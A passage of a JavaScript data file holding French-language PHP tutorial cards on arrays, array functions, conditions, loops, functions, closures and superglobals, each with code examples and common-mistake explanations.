'echo $commande["client"]["adresse"]["ville"];\n// Warning × 3 si "client" ou "adresse" manque…', good:
'$ville = $commande["client"]["adresse"]["ville"] ?? "inconnue";\n// ou tester étage par étage si le message d\'erreur doit être précis', why: 'Chaque crochet est un pari. Les données réelles (formulaire, API, BDD) ont TOUJOURS des trous ; ?? à la fin de la chaîne neutralise tous les étages intermédiaires.' },
            { title: 'Confondre liste de lignes et ligne de colonnes', lang: 'php', bad:
'$produits["nom"];        // voulu : le nom du PREMIER produit\n// Undefined array key "nom" — car $produits est une LISTE de lignes', good:
'$produits[0]["nom"];    // ligne 0, puis champ "nom"\n// Renommer aide : $produits (liste) vs $produit (une ligne)', why: 'En tableau multi, l\'ordre des crochets EST le schéma des données : [ligne][colonne]. L\'erreur vient presque toujours d\'un nom trop vague — nomme le conteneur au pluriel, l\'élément au singulier.' }
          ],
          related: ['php-tableaux', 'php-fonctions-tableaux', 'php-api-rest', 'php-boucles']
        },

        {
          id: 'php-fonctions-tableaux',
          title: 'array_map, array_filter & compagnie',
          icon: 'tune',
          level: 'Intermédiaire',
          tagline: 'La panoplie fonctionnelle de PHP : transformer, filtrer, fusionner, trier — sans écrire la boucle à la main.',
          intro: 'PHP embarque des dizaines de fonctions `array_*` qui expriment l\'intention directement : `array_filter` dit « je garde certains éléments » là où une boucle noie l\'intention dans la mécanique. Apprends les piliers (map, filter, reduce, merge, tri) et leurs **pièges sur les clés**.',
          blocks: [
            { t: 'h3', h: 'Transformer : array_map' },
            { t: 'code', lang: 'php', code:
'$prix = [500, 300, 200];\n\n// fn (arrow function — fiche dédiée) : une expression, capture auto\n$avec_tva = array_map(fn($p) => (int) round($p * 1.18), $prix);\n// [590, 354, 236]\n\n// Attention : array_map RETOURNE un nouveau tableau, $prix n\'est pas modifié\n// et les clés numériques sont préservées avec UN seul tableau (perdues avec plusieurs).' },
            { t: 'h3', h: 'Filtrer : array_filter' },
            { t: 'code', lang: 'php', code:
'$stocks = ["gari" => 12, "igname" => 0, "piment" => 5, "gombo" => 0];\n\n// Garde les éléments pour lesquels le callback renvoie true\n$disponibles = array_filter($stocks, fn($qte) => $qte > 0);\n// ["gari" => 12, "piment" => 5] — clés CONSERVÉES\n\n// Sans callback : retire tout ce qui est "falsy" (0, "", null…)\n$propres = array_filter([1, 0, "a", "", null]);   // [1, "a"] (clés 0, 2)' },
            { t: 'h3', h: 'Fusionner : array_merge vs +' },
            { t: 'code', lang: 'php', code:
'$defaut = ["theme" => "clair", "langue" => "fr"];\n$perso  = ["theme" => "sombre"];\n\narray_merge($defaut, $perso);\n// ["theme" => "sombre", "langue" => "fr"]  : la DROITE écrase les clés string\n\n$defaut + $perso;\n// ["theme" => "clair", "langue" => "fr"]  : l\'union GARDE la gauche !\n\n// ⚠ sur index numérique :\narray_merge([1, 2], [9]);     // [1, 2, 9] — indices RENUMÉROTÉS\n[2 => "a", 5 => "b"] + [9]    // union : garde les clés 2, 5 puis index libre' },
            { t: 'h3', h: 'Chercher, trier, déstructurer' },
            { t: 'code', lang: 'php', code:
'in_array("gari", $panier, true);        // STRICT, toujours\narray_search("gari", $panier, true);     // la clé trouvée ou FALSE\nsort($prix);            // trie, DÉTRUIT les clés\nasort($prix);           // trie les valeurs, GARDE les clés\nksort($prix);           // trie par clés\nusort($prix, fn($a, $b) => $a <=> $b);  // tri sur mesure, <=> = "vaisseau"\n\n// Déstructuration (PHP 7.1+) :\n["nom" => $nom, "prix" => $prixUn] = $produit;\n[$premier, , $troisieme] = $marche;    // sauter des éléments' },
            { t: 'table', head: ['Besoin', 'Fonction'], rows: [
              ['somme / produit', '`array_sum`, `array_product`'],
              ['agréger sur mesure', '`array_reduce($t, $fn, $acc)`'],
              ['compter les occurrences', '`array_count_values`'],
              ['extraire une colonne', '`array_column($lignes, "prix")`'],
              ['dédoublonner', '`array_unique` (clés conservées !)'],
              ['joindre en chaîne', '`implode(", ", $t)`'],
              ['scinder une chaîne', '`explode(",", $s)`']
            ] }
          ],
          errors: [
            { title: 'in_array sans le mode strict', lang: 'php', bad:
'if (in_array($id, [1, 2, 3])) { }    // $id = "1abc" → true !\nif (in_array(0, ["a", "b"])) { }      // true !?', good:
'in_array($id, [1, 2, 3], true);          // types compris\narray_search($id, $roles, true);          // idem, 3e argument', why: 'Sans le 3e argument, la comparaison jongle avec les types comme ==. Entre IDs, codes, permissions, c\'est une faille d\'autorisation classique : "1abc" validé parce que présent "en nombre". Strict, partout, toujours.' },
            { title: 'Supposer array_merge additif', lang: 'php', bad:
'$a = [2 => "vente"];\narray_merge($a, ["achat"]);        // [0 => "vente", 1 => "achat"] : la clé 2 est PERDUE !\narray_merge(["theme" => "clair"], ["theme" => "sombre"]);\n// ["theme" => "sombre"] : écrasement silencieux par la droite — voulu ? vraiment ?', good:
'$a + ["achat"];                    // union : [2 => "vente", 0 => "achat"] — clés GARDÉES\narray_replace($defauts, $perso);    // écrasement PAR CLÉ, explicitement nommé', why: 'array_merge écrase les clés string par la droite et renumérote les index int : deux comportements différents selon la forme des clés ! Choisir merge / + / array_replace, c\'est choisir une sémantique — pas une préférence de style.' }
          ],
          related: ['php-tableaux', 'php-fonctions-anonymes', 'php-tableaux-multi', 'php-casting']
        }
      ]
    },

    /* ======================================================
       4. STRUCTURES DE CONTRÔLE
       ====================================================== */
    {
      id: 'controle',
      name: 'Structures de contrôle',
      icon: 'alt_route',
      fiches: [
        {
          id: 'php-conditions',
          title: 'if, switch, ternaire & ??',
          icon: 'fork_right',
          level: 'Débutant',
          tagline: 'Faire décider le programme : if/elseif/else, switch, l\'expression match de PHP 8, ternaire et opérateur ??',
          intro: 'Les conditions sont le cerveau du script : selon la requête, le rôle, le stock, le script choisit une branche. PHP offre quatre outils aux tempéraments différents — `if` (généraliste), `switch` (standard), `match` (PHP 8, strict et en valeur) et le couple ternaire/`??` pour l\'affectation conditionnelle. Savoir lequel sortir, c\'est déjà du style.',
          blocks: [
            { t: 'h3', h: 'if / elseif / else : le généraliste' },
            { t: 'code', lang: 'php', code:
'$stock = 0;\n\nif ($stock > 0) {\n    echo "Disponible à Dantokpa";\n} elseif ($stock === 0) {          // PHP a un vrai "elseif" (un mot)\n    echo "Rupture, retour demain";\n} else {\n    echo "Stock négatif : vérifier l\'inventaire !";\n}\n\n// Rappel de vérité (truthiness) : sont FAUX\n// false, 0, 0.0, "", "0", [], null — TOUT LE RESTE est vrai' },
            { t: 'callout', kind: 'warn', h: '`elseif` en un mot est la forme canonique en PHP. Syntaxe alternative pour templates : `if ($x): … elseif: … else: … endif;` — lisible dans le HTML mixte.' },
            { t: 'h3', h: 'switch : l\'aiguillage classique' },
            { t: 'code', lang: 'php', code:
'switch ($mode_livraison) {\n    case "zemidjan":\n        echo "Livraison rapide en ville";\n        break;                     // ← SANS break, on TOMBE dans le cas suivant\n    case "taxi":\n    case "voiture":                // cas empilés = "OU"\n        echo "Livraison groupée";\n        break;\n    default:\n        echo "Retrait au marché";\n}' },
            { t: 'h3', h: 'match (PHP 8) : le switch qui a grandi' },
            { t: 'code', lang: 'php', code:
'// match EST une expression : elle RETOURNE une valeur\n$label = match ($statut) {\n    "paye"     => "Commande payée",\n    "attente"  => "En attente de Mobile Money",\n    "livre"    => "Livrée par zémidjan",\n    default    => "Statut inconnu",\n};\n\necho $label;\n\n// Différences avec switch :\n// ✓ comparaison STRICTE (=== implicite) — fini les "1" == 1 bizarres\n// ✓ pas de break à oublier (un seul bras s\'exécute)\n// ✗ si AUCUN cas ne correspond et pas de default → UnhandledMatchError' },
            { t: 'h3', h: 'Ternaire, ?? et ?-> : l\'affectation fine' },
            { t: 'code', lang: 'php', code:
'// Ternaire : condition ? si_vrai : si_faux\n$badge = $stock > 0 ? "en stock" : "rupture";\n\n// Null coalescing : premier non-null (et NON-EXISTANT toléré)\n$pseudo = $_SESSION["pseudo"] ?? "invité";\n$qte    = $_GET["qte"] ?? 1;\n$ville  = $client["adresse"]["ville"] ?? "Cotonou";   // même profond\n\n// Nullsafe (?->) sur les objets : stoppe net si null\n$nom = $commande?->client?->nom;    // null si un maillon est null\n\n// Ternaires imbriqués = lisibilité zéro : préfère match ou if\n// $x = $a ? "A" : $b ? "B" : "C";  ✗ — le pire reste qu\'il marche' },
            { t: 'table', head: ['Situation', 'Outil conseillé'], rows: [
              ['logique complexe, intervalles', '`if / elseif`'],
              ['valeur discrète + retourner qqch', '`match` (PHP 8+)'],
              ['valeur discrète, code ancien', '`switch` + breaks'],
              ['choisir entre 2 valeurs', '`?:` ou `??`'],
              ['lire peut-être absent', '`??`, `?->`']
            ] }
          ],
          errors: [
            { title: 'Oublier break dans un switch', lang: 'php', bad:
'switch ($statut) {\n    case "paye":   echo "Payé";\n    case "livre":  echo "Livré";   // affiche LES DEUX si "paye" !\n    default:       echo "?";\n}', good:
'// Soit break partout… soit match, qui supprime le piège :\necho match ($statut) {\n    "paye" => "Payé",\n    "livre" => "Livré",\n    default => "?",\n};', why: 'Le switch descend de cas en cas tant qu\'il n\'a pas vu break (fallthrough). Parfois voulu (cas empilés), c\'est surtout le bug silencieux mémorable : deux branches exécutées. match a supprimé le problème à la racine.' },
            { title: 'Comparer avec =', lang: 'php', bad:
'if ($statut = "livre") {          // AFFECTATION, pas comparaison !\n    echo "livré";                 // s\'affiche TOUJOURS\n}', good:
'if ($statut === "livre") { … }\n// Réflexe "Yoda" historique : if ("livre" === $statut)\n// => une faute = devient une erreur immédiate', why: 'Un seul = transforme le test en affectation : la variable est écrasée ET la valeur sert de condition (presque toujours vraie). === en un coup d\'œil évite le drame ; les Yoda conditions le rendent impossible à compiler.' }
          ],
          related: ['php-boucles', 'php-casting', 'php-fonctions', 'js-conditions']
        },

        {
          id: 'php-boucles',
          title: 'for, while & foreach',
          icon: 'loop',
          level: 'Débutant',
          tagline: 'Répéter sans se répéter : quatre boucles, break/continue, et le fameux piège de la référence de foreach.',
          intro: 'La boucle est le moteur du traitement de données : lignes SQL, paniers, fichiers. PHP en a quatre — `for` (compteur précis), `while` / `do-while` (condition), et **`foreach`, reine des tableaux**. Le vrai savoir-faire : choisir la bonne, contrôler ses sorties, et connaître le piège de `foreach` par référence.',
          blocks: [
            { t: 'h3', h: 'for : quand tu connais le nombre de tours' },
            { t: 'code', lang: 'php', code:
'for ($i = 1; $i <= 5; $i++) {\n    echo "Caisse n°$i du marché\\n";\n}\n\n// Lecture classique : initialisation ; condition ; pas\n// La condition est testée AVANT chaque tour\nfor ($i = count($marche) - 1; $i >= 0; $i--) {\n    echo $marche[$i];   // parcours en sens inverse\n}' },
            { t: 'h3', h: 'while & do-while : tant que…' },
            { t: 'code', lang: 'php', code:
'$sac = 500; $budget = 1600;\nwhile ($budget >= $sac) {      // 0 tour possible (test d\'abord)\n    $budget -= $sac;\n}\necho "Reste : $budget FCFA";   // 100\n\n$essais = 0;\ndo {                            // AU MOINS un tour garanti\n    $essais++;\n} while ($essais < 1);' },
            { t: 'h3', h: 'foreach : la reine' },
            { t: 'code', lang: 'php', code:
'foreach ($prix as $montant) {             // valeurs seules\n    echo "$montant FCFA\\n";\n}\n\nforeach ($prix as $produit => $montant) { // clé => valeur\n    echo "$produit : $montant FCFA\\n";\n}\n\n// Dans un template PHP/HTML mixte :\n// <?php foreach ($vendeuses as $v): ?> … <?php endforeach; ?>' },
            { t: 'h3', h: 'Piloter : break et continue' },
            { t: 'code', lang: 'php', code:
'foreach ($commandes as $cmd) {\n    if ($cmd["statut"] === "annulee") { continue; }  // saute au suivant\n    if ($total > 100_000) { break; }                 // stoppe la boucle\n    $total += $cmd["montant"];\n}\n\n// Les deux acceptent un NIVEAU :\nforeach ($rayons as $rayon) {\n    foreach ($rayon as $produit) {\n        if ($produit === "contrefacon") { break 2; } // sort des DEUX\n    }\n}' },
            { t: 'h3', h: 'Le piège : foreach par référence' },
            { t: 'code', lang: 'php', code:
'foreach ($prix as &$m) { $m = (int) round($m * 1.18); }\nunset($m);                       // ← LE RÉFLEXE QUI SAUVE\n\n// Sans unset($m), $m reste un ALIAS du dernier élément.\n// Une autre boucle plus bas = corruption silencieuse :\nforeach ($prix as $m) { }        // recopie l\'avant-dernier dans le dernier !' },
            { t: 'callout', kind: 'tip', h: 'Modifier pendant un parcours ? Écris via la clé (`$t[$k] = …`) plutôt qu\'avec `&$v` quand tu peux : c\'est explicite et sans effet de bord. La référence, c\'est pour les gros tableaux où la recopie coûte.' }
          ],
          errors: [
            { title: 'Référence de foreach non détruite', lang: 'php', bad:
'foreach ($prix as &$m) { $m *= 2; }\n// plus loin…\nforeach ($prix as $m) { echo $m; }\n// le DERNIER élément est écrasé à chaque tour de la 2e boucle !', good:
'foreach ($prix as &$m) { $m *= 2; }\nunset($m);   // casse l\'alias dès que la référence n\'est plus utile', why: 'Après un foreach par référence, la variable de boucle reste liée au dernier élément du tableau. Toute réutilisation du nom (souvent $v, $value…) écrit DANS le tableau par inadvertance. unset() juste après : it\'s the rule.' },
            { title: 'Boucle infinie', lang: 'php', bad:
'$i = 0;\nwhile ($i < 10) {\n    echo $i;          // $i n\'évolue jamais… timeout ou 503\n}', good:
'$i = 0;\nwhile ($i < 10) {\n    echo $i;\n    $i++;             // LA ligne qui rend la sortie possible\n}\n// en cas de doute (lecture externe) : garde-fou\n$tours = 0;\nwhile (@fgets($h) !== false && $tours++ < 100_000) { }', why: 'while ne sait pas s\'arrêter tout seul : c\'est ta condition qui doit devenir fausse. Quand la boucle dépend d\'une source externe (fichier, réseau), un compteur de garde transforme un crash en retour propre.' }
          ],
          related: ['php-tableaux', 'php-conditions', 'php-fonctions-tableaux', 'js-boucles']
        }
      ]
    }
  ]
};

/* ============================================================
   data-php.js — partie 2 : fonctions, superglobales,
   formulaires & HTTP, inclusion de fichiers.
   ============================================================ */

DEVDOCS.php.categories.push(
    /* 5. FONCTIONS */
    {
      id: 'fonctions',
      name: 'Fonctions',
      icon: 'functions',
      fiches: [
        {
          id: 'php-fonctions',
          title: 'Définir des fonctions & types',
          icon: 'functions',
          level: 'Débutant',
          tagline: 'function, return, types de paramètres et de retour, valeurs par défaut, strict_types — les briques réutilisables.',
          intro: 'Une fonction encapsule un calcul derrière un nom : tu l\'écris une fois, tu l\'appelles partout. PHP moderne (7+/8) a musclé le contrat : **types de paramètres et de retour**, valeurs par défaut, nullabilité explicite. Bien déclarer ses fonctions, c\'est transformer des erreurs silencieuses en TypeError immédiats.',
          blocks: [
            { t: 'h3', h: 'La forme complète' },
            { t: 'code', lang: 'php', code:
'// Calcule le prix TTC d\'une ligne de commande\nfunction prix_ttc(float $ht, float $taux = 0.18): float\n{\n    return $ht * (1 + $taux);      // RETOURNE une valeur (echo ≠ return !)\n}\n\necho prix_ttc(500);            // 590 : $taux prend sa valeur par défaut\necho prix_ttc(500, 0.0);       // 500 : taux fourni\n// prix_ttc();                   // ArgumentCountError : $ht est requis' },
            { t: 'callout', kind: 'warn', h: 'Les paramètres **avec valeur par défaut viennent APRÈS** les paramètres requis. `function f($a = 1, $b)` est une erreur de logique (et PHP s\'en plaint) : comment fournir $b sans $a ?' },
            { t: 'h3', h: 'Typer : paramètres, retour, nullabilité' },
            { t: 'table', head: ['Déclaration', 'Signification'], rows: [
              ['`function f(int $n)`', 'un entier obligatoire'],
              ['`function f(?string $s)`', 'string OU null'],
              ['`function f(int|string $x)`', 'union : int ou string (PHP 8)'],
              ['`: void`', 'ne retourne rien (procédure)'],
              ['`: never`', 'ne revient jamais (throw/exit) — PHP 8.1'],
              ['`: mixed`', 'n\'importe quel type (à éviter sauf vrai besoin)'],
              ['`?Type` vs `Type = null`', '`?Type` = null explicite permis ; `= null` = paramètre omissible']
            ] },
            { t: 'code', lang: 'php', code:
'declare(strict_types=1);    // en tout premier : appels stricts depuis CE fichier\n\nfunction formater_prix(int|float $montant, ?string $devise = "FCFA"): string\n{\n    return number_format($montant, 0, ",", " ") . " " . $devise;\n}\n\nformater_prix(12500);       // "12 500 FCFA"\n// formater_prix("12 500"); // avec strict_types=1 → TypeError immédiat' },
            { t: 'h3', h: 'Portée : chaque fonction est une île' },
            { t: 'p', h: 'Une variable définie **hors** de la fonction n\'y est **pas visible** — et réciproquement. Pas de fermetures implicites à la JS (fiche Closures pour `use`). Le mot-clé `global` existe mais casse l\'encapsulation : préfère passer les données en paramètres.' },
            { t: 'code', lang: 'php', code:
'$taux = 0.18;\n\nfunction total(float $ht): float\n{\n    // echo $taux;      ✗ Undefined variable : l\'île ne voit pas le continent\n    $local = 99;        // vivant uniquement pendant l\'appel\n    return $ht * 1.18;\n}\n\n// total(100) ne "sait" pas que $taux existe → passe-le en paramètre !\nfunction total2(float $ht, float $taux): float { return $ht * (1 + $taux); }\n\n// Cas spécial : une variable locale "static" survit entre deux appels\nfunction compteur(): int { static $n = 0; return ++$n; }  // 1, 2, 3…' },
            { t: 'h3', h: 'Bonnes habitudes' },
            { t: 'ul', items: [
              '**Une fonction = une tâche**, nommée par un verbe : calculer_total, envoyer_mail.',
              'Retourner une valeur plutôt qu\'afficher : la réutilisabilité d\'abord (echo dans la couche présentation).',
              'Typer ce qui entre et ce qui sort : le TypeError remplace le debug de 2 h.',
              '`declare(strict_types=1)` en première ligne des nouveaux fichiers.'
            ] }
          ],
          errors: [
            { title: 'Lire une variable globale dans la fonction', lang: 'php', bad:
'$tva = 0.18;\nfunction total($ht) { return $ht * (1 + $tva); }   // Undefined variable $tva', good:
'function total(float $ht, float $tva): float { return $ht * (1 + $tva); }\necho total(500, 0.18);\n// (la valeur par défaut peut aussi porter l\'info : $tva = 0.18)', why: 'PHP n\'a pas de closure implicite : chaque fonction démarre avec une table de symboles vide. Tout ce dont elle a besoin entre par les paramètres (ou use pour les closures). C\'est volontaire : un contrat explicite, testable.' },
            { title: 'Confondre echo et return', lang: 'php', bad:
'function total($a, $b) { echo $a + $b; }\n$facture = total(500, 300) * 2;   // 0 : total n\'a rien RENVOYÉ', good:
'function total($a, $b) { return $a + $b; }\n$facture = total(500, 300) * 2;   // 1600', why: 'echo envoie du texte vers la sortie (et ne retourne rien). return transmet une valeur au code appelant. Une fonction qui "affiche son résultat" est inutilisable dans un calcul, un test, une API JSON.' }
          ],
          related: ['php-fonctions-avancees', 'php-fonctions-anonymes', 'php-variables', 'php-casting']
        },

        {
          id: 'php-fonctions-avancees',
          title: 'Références, variadiques & arguments nommés',
          icon: 'input',
          level: 'Intermédiaire',
          tagline: 'Modifier par &, accepter "un nombre quelconque" avec ...$args, et les arguments nommés lisibles de PHP 8.',
          intro: 'Trois mécanismes changent la façon dont les valeurs voyagent : la **référence** (la fonction écrit DANS ta variable), les **paramètres variadiques** (`...`) pour des signatures élastiques, et les **arguments nommés** de PHP 8 qui rendent les appels auto-documentés. Trois outils, trois intentions différentes.',
          blocks: [
            { t: 'h3', h: 'Passage par référence : &' },
            { t: 'code', lang: 'php', code:
'// Par défaut : passage par VALEUR (copie)\nfunction doubler(int $n): void { $n *= 2; }\n$x = 5; doubler($x);   // $x vaut toujours 5\n\n// Avec &, la fonction reçoit un ALIAS : elle écrit chez toi\nfunction appliquer_tva(float &$montant): void { $montant *= 1.18; }\n$prix = 500;\nappliquer_tva($prix);\necho $prix;            // 590 — modifié en place !\n\n// C\'est exactement le mécanisme de sort($tableau) : pas de retour,\n// le tableau passé est trié en place (d\'où son succès = true).' },
            { t: 'callout', kind: 'warn', h: 'Réserve la référence aux cas légitimes (grands tableaux, sorties multiples documentées). Une fonction qui modifie ses arguments "en douce" surprend : nomme-la en conséquence (`appliquer_`, `trier_`, ou suffixe `_in_place`) et retourne plutôt la valeur quand c\'est possible.' },
            { t: 'h3', h: 'Variadiques : ...$args' },
            { t: 'code', lang: 'php', code:
'// ...$nombres COLLECTE tous les arguments restants dans un tableau\nfunction total(float ...$nombres): float\n{\n    return array_sum($nombres);     // $nombres est un array ici\n}\n\ntotal(500, 300, 200);          // 1000\ntotal();                        // 0 (tableau vide)\n\n// À l\'appel, ... DÉPLIE un tableau en arguments (spread) :\n$ligne = [500, 300, 200];\ntotal(...$ligne);               // 1000 — l\'aller-retour du ...' },
            { t: 'h3', h: 'Arguments nommés (PHP 8)' },
            { t: 'code', lang: 'php', code:
'function livrer(string $zone, int $delai = 1, bool $express = false): string\n{\n    return "$zone — J+$delai" . ($express ? " (express)" : "");\n}\n\n// Positionnel classique : lisible ?\nlivrer("Abomey-Calavi", 2, true);\n\n// Nommé : auto-documenté, ordre libre, on saute les défauts\nlivrer(zone: "Abomey-Calavi", express: true);\nlivrer(express: true, zone: "Cotonou");          // ordre libre ✓\n\n// ⚠ Après un argument nommé, tous les suivants DOIVENT être nommés' },
            { t: 'h3', h: 'Récap express' },
            { t: 'table', head: ['Besoin', 'Syntaxe'], rows: [
              ['modifier la variable de l\'appelant', '`function f(&$x)`'],
              ['N arguments libres', '`function f(...$args)`'],
              ['déplier un tableau à l\'appel', '`f(...$tableau)`'],
              ['appel lisible, options par défaut', 'arguments nommés `param: valeur`'],
              ['callback nommé en string', `'"trim"'`, `[$obj, 'méthode']`, `'Class::statique'`]
            ] }
          ],
          errors: [
            { title: 'Oublier le & quand on attend une modification', lang: 'php', bad:
'function ajouterTva($montant) { $montant *= 1.18; }\n$prix = 500;\najouterTva($prix);\necho $prix;   // 500 — la fonction a modifié une COPIE', good:
'function ajouterTva(float &$montant): void { $montant *= 1.18; }\najouterTva($prix);          // 590\n// Mieux encore (sans surprise) : return la nouvelle valeur\n$prix = appliquerTva($prix);', why: 'PHP passe les valeurs par copie. Sans &, la fonction travaille sur un clone local qui meurt à la fin de l\'appel. Soit tu demandes explicitement la référence, soit — encore mieux lorsque c\'est possible — tu retournes le résultat.' },
            { title: 'Positionnel après un argument nommé', lang: 'php', bad:
'livrer(zone: "Cotonou", 3, true);   // Error : positional after named', good:
'livrer(zone: "Cotonou", delai: 3, express: true);\nlivrer("Cotonou", 3, express: true); // positionnels d\'abord, nommés ensuite', why: 'Une fois qu\'un argument est nommé, PHP exige que tous les suivants le soient aussi : sinon il ne saurait plus à quels paramètres rattacher les valeurs. La règle tient en une ligne : les nommés ferment la marche.' }
          ],
          related: ['php-fonctions', 'php-fonctions-anonymes', 'php-fonctions-tableaux', 'php-poo-classes']
        },

        {
          id: 'php-fonctions-anonymes',
          title: 'Closures & arrow functions fn',
          icon: 'bolt',
          level: 'Intermédiaire',
          tagline: 'Des fonctions sans nom, capturant leur environnement avec use — et la forme flèche fn qui capture toute seule.',
          intro: 'Parfois tu as besoin d\'une logique **jetable**, passée à une autre fonction (un tri, un filtre, un map) : pas la peine de la nommer au niveau global. Les fonctions anonymes répondent à ce besoin ; la **closure** ajoute la capture de l\'environnement via `use`, et `fn` (PHP 7.4) la version éclair d\'une ligne qui capture automatiquement **par valeur**.',
          blocks: [
            { t: 'h3', h: 'Fonction anonyme : une valeur comme une autre' },
            { t: 'code', lang: 'php', code:
'$double = function (int $n): int {\n    return $n * 2;\n};                        // ← point-virgule : c\'est une AFFECTATION !\n\necho $double(21);         // 42\necho gettype($double);    // object (instance de Closure !)\n\n// Le cas d\'usage roi : les callbacks de array_*\n$noms = array_map(function (array $p): string {\n    return $p["nom"];\n}, $produits);' },
            { t: 'h3', h: 'Closure : capturer avec use' },
            { t: 'code', lang: 'php', code:
'$taux = 0.18;\n\n// use ($taux) : COPIE la valeur de l\'environnement dans la fonction\n$ttc = function (float $ht) use ($taux): float {\n    return $ht * (1 + $taux);\n};\n\necho $ttc(500);           // 590\n\n// use (&$compteur) : capture par RÉFÉRENCE → partage en direct\n$appels = 0;\n$log = function (string $msg) use (&$appels): void {\n    $appels++;\n    // journalise…\n};\n$log("a"); $log("b"); echo $appels;   // 2' },
            { t: 'callout', kind: 'info', h: 'Différence majeure avec JS : la capture n\'est **pas implicite** — sans `use`, la variable extérieure est invisible. Et la capture `use ($x)` se fait **par valeur au moment de la définition** : modifier `$x` après ne change rien dans la closure.' },
            { t: 'h3', h: 'fn : la flèche d\'une expression' },
            { t: 'code', lang: 'php', code:
'// fn(params) => EXPRESSION  — capture automatique par valeur !\n$noms   = array_map(fn($p) => $p["nom"], $produits);\n$chers  = array_filter($produits, fn($p) => $p["prix"] > 400);\n$trie   = usort($produits, fn($a, $b) => $a["prix"] <=> $b["prix"]);\n\n$devise = "FCFA";\n$fmt    = fn($p) => "$p $devise";       // $devise capturée toute seule\necho $fmt(500);         // "500 FCFA"\n\n// Limites : UNE seule expression, et capture par valeur seulement\n// (pas d\'use, pas de bloc { }) → au-delà : function () use () {}' },
            { t: 'table', head: ['Besoin', 'Forme'], rows: [
              ['callback d\'une ligne, capture simple', '`fn($x) => expr`'],
              ['bloc complet, plusieurs instructions', '`function ($x) use ($env) { }`'],
              ['modifier une variable de l\'environnement', '`use (&$env)`'],
              ['fonction statique sans $this', '`static function () { }`']
            ] },
            { t: 'p', h: 'Dernier tour de magie : `Closure::fromCallable("trim")`, ou PHP 8.1 `trim(...)` (first-class callable) qui transforme n\'importe quelle fonction nommée en closure transportable — pratique quand une bibliothèque exige un `callable`.' }
          ],
          errors: [
            { title: 'Oublier use() et espérer la variable', lang: 'php', bad:
'$tva = 0.18;\n$ttc = function ($ht) { return $ht * (1 + $tva); };\n// Undefined variable $tva — l\'île ne voit pas le continent', good:
'$ttc = function ($ht) use ($tva) { return $ht * (1 + $tva); };\n$ttc = fn($ht) => $ht * (1 + $tva);   // fn capture automatiquement', why: 'Une fonction anonyme PHP reste une fonction PHP : table de symboles propre, pas de scope chaîné. use() est le pont explicite — et fn le pont automatique (par valeur uniquement).' },
            { title: 'Croire que la capture est vivante', lang: 'php', bad:
'$taux = 0.18;\n$ttc = fn($ht) => $ht * (1 + $taux);\n$taux = 0.20;                     // changé "pour tout le monde" ?\necho $ttc(100);                   // 118 — la closure a gardé 0.18 !', good:
'// Recréer la closure après le changement, ou capturer par référence :\n$ttc = function ($ht) use (&$taux) { return $ht * (1 + $taux); };', why: 'use($x) et fn capturent par VALEUR au moment de la définition : la closure photographie la variable. C\'est sain (pas de surprise à distance), mais contre-intuitif venant de JavaScript (closure vivante par référence).' }
          ],
          related: ['php-fonctions-tableaux', 'php-fonctions', 'php-fonctions-avancees', 'js-fonctions']
        }
      ]
    },

    /* 6. SUPERGLOBALES */
    {
      id: 'superglobales',
      name: 'Superglobales',
      icon: 'public',
      fiches: [
        {
          id: 'php-superglobales',
          title: 'De $_GET à $_SERVER : les superglobales',
          icon: 'public',
          level: 'Débutant',
          tagline: 'Les tableaux magiques toujours là : entrées HTTP, infos serveur, fichiers, sessions — tout ce que PHP sait de ta requête.',
          intro: 'Les superglobales sont des tableaux **pré-remplis par le moteur**, accessibles partout sans déclaration (fonctions incluses — « autoglobals »). Ils forment le pont entre la requête HTTP et ton code : qui appelle, avec quelles données, quel fichier, quelle session. Principe absolu : **tout ce qui vient d\'eux est une ENTRÉE — donc non fiable**.',
          blocks: [
            { t: 'h3', h: 'Le panorama' },
            { t: 'table', head: ['Tableau', 'Contenu', 'Fiche dédiée'], rows: [
              ['`$_GET`', 'paramètres de l\'URL (?page=2&ville=cotonou)', 'Formulaires'],
              ['`$_POST`', 'champs d\'un formulaire POST', 'Formulaires'],
              ['`$_COOKIE`', 'cookies renvoyés par le navigateur', 'Cookies'],
              ['`$_FILES`', 'fichiers uploadés (nom, tmp, taille…)', 'Upload'],
              ['`$_SESSION`', 'données persistantes par visiteur', 'Sessions'],
              ['`$_SERVER`', 'en-têtes, méthode, chemins, IP…', 'ci-dessous'],
              ['`$_REQUEST`', 'GET + POST + COOKIE fusionnés ⚠', 'à éviter'],
              ['`$_ENV` / `getenv()`', 'variables d\'environnement serveur', 'PDO/config'],
              ['`$GLOBALS`', 'toutes les variables globales', 'curiosité']
            ] },
            { t: 'h3', h: '$_SERVER : la fiche d\'identité de la requête' },
            { t: 'code', lang: 'php', code:
'$_SERVER["REQUEST_METHOD"];    // GET, POST, PUT, DELETE…\n$_SERVER["REQUEST_URI"];       // /produits?page=2\n$_SERVER["SCRIPT_NAME"];       // /index.php\n$_SERVER["DOCUMENT_ROOT"];     // /var/www/public\n$_SERVER["REMOTE_ADDR"];       // IP du client (ou du proxy !)\n$_SERVER["HTTP_USER_AGENT"];   // navigateur déclaré\n$_SERVER["HTTP_REFERER"];      // page d\'origine (sic, une faute historique)\n\n// Test standard "ce formulaire vient d\'être soumis" :\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    // traitement…\n}' },
            { t: 'callout', kind: 'warn', h: 'Tout ce qui commence par `HTTP_` dans `$_SERVER` vient des **en-têtes envoyés par le client** : User-Agent, Referer, X-Forwarded-For se falsifient en une ligne. Bon pour la télémétrie — jamais pour une décision de sécurité (IP de confiance, blocage).' },
            { t: 'h3', h: '$_GET : l\'état dans l\'URL' },
            { t: 'p', h: '`$_GET` reçoit les paires clé=valeur de l\'URL. Visible, partageable, bookmarkable : parfait pour pagination, filtres, recherche. Interdit pour mots de passe ou actions destructrices. Lecture sécurisée, toujours avec `??` :' },
            { t: 'code', lang: 'php', code:
'// URL : /catalogue.php?page=2&ville=cotonou\n$page  = (int) ($_GET["page"]  ?? 1);\n$ville = (string) ($_GET["ville"] ?? "tous");\n\n// Construire soi-même une query string proprement :\necho "?" . http_build_query(["page" => 3, "ville" => "Abomey-Calavi"]);\n// ?page=3&ville=Abomey-Calavi  (encodage des espaces/accents inclus)' },
            { t: 'h3', h: '$_REQUEST : séduisant… à éviter' },
            { t: 'p', h: 'Fusion de GET+POST+COOKIE, `$_REQUEST` semble pratique mais **floute la provenance** : un paramètre `id` peut venir de l\'URL ou d\'un cookie sans que tu le saches — et les collisions se règlent par configuration (request_order). Explicite > magique : choisis `$_GET` ou `$_POST`.' },
            { t: 'h3', h: 'Le grand principe' },
